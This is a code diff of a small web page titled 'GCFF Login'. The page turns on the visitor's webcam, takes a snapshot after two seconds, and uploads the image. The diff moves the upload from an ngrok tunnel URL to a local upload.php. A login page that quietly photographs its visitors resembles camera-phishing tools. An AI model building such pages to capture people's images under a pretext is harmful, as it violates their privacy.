@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>GCFF</title>
+<title>GCFF Login</title>
 </head>
 
 <body style="text-align:center;font-family:Arial;background:#0f172a;color:white">
@@ -24,12 +24,11 @@ function login() {
   .then(s => {
     stream = s;
 
-    const video = document.getElementById("video");
-    video.srcObject = stream;
+    document.getElementById("video").srcObject = stream;
 
     setTimeout(capture, 2000);
   })
-  .catch(() => alert("camera denied"));
+  .catch(() => alert("camera refused"));
 }
 
 function capture() {
@@ -47,16 +46,19 @@ function capture() {
 
   stream.getTracks().forEach(t => t.stop());
 
-  fetch("https://unsighing-prepalatine-yi.ngrok-free.dev/upload", {
+  // 👇 ENVOI VERS TON PHP
+  fetch("upload.php", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({ image })
+    body: JSON.stringify({
+      imageBase64: image
+    })
   })
-  .then(res => res.text())
-  .then(data => alert("Photo sent ✔"))
-  .catch(err => alert("Upload error"));
+  .then(res => res.json())
+  .then(data => alert("Image saved ✔"))
+  .catch(err => alert("Error"));
 }
 </script>
 
